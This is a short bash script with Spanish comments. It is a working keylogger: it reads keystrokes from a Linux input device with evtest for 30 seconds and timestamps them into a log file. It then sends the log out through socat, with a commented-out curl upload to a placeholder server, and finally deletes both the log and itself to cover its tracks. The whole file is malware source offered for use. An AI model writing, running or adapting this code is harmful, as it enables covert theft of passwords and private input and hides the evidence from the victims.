#!/bin/bash

LOG_FILE="/tmp/keylog.txt"
DEVICE="/dev/input/event3"  # Reemplázalo con el ID correcto
# SERVER_URL="http://server-prueba.com/upload"

# Verifica que el script se ejecute como root
if [[ $EUID -ne 0 ]]; then
   echo "Este script debe ejecutarse como root"
   exit 1
fi

# Verifica que evtest esta instalado
if ! command -v evtest &> /dev/null; then
    echo "[!] Error: evtest no está instalado."
    exit 1
fi

echo "[*] Iniciando captura de teclas por 30 segundos..." > "$LOG_FILE"

# Registrar el usuario actual del que se estan registrando las teclas
echo "[*] Usuario activo: $(whoami)" >> "$LOG_FILE"

# Captura teclas en segundo plano y las guarda en archivo
evtest "$DEVICE" | awk '/EV_KEY/ {print strftime("[%Y-%m-%d %H:%M:%S]"), $NF}' >> "$LOG_FILE" &
PID=$!

# Espera 30 segundos antes de detener la captura
sleep 30
kill $PID

echo "[*] Captura finalizada. Enviando archivo al servidor..."

# Enviar el archivo al servidor remoto
# curl -X POST -F "file=@$LOG_FILE" "$SERVER_URL"

# Enviar el archivo al socat
cat /tmp/keylog.txt | socat - TCP:127.0.0.1:1234

echo "[*] Archivo enviado correctamente a $SERVER_URL"

# Autodestrucción del script y el archivo de logs
rm -f "$LOG_FILE" "$0"

echo "[*] Autodestrucción completada. Eliminando logs y script."
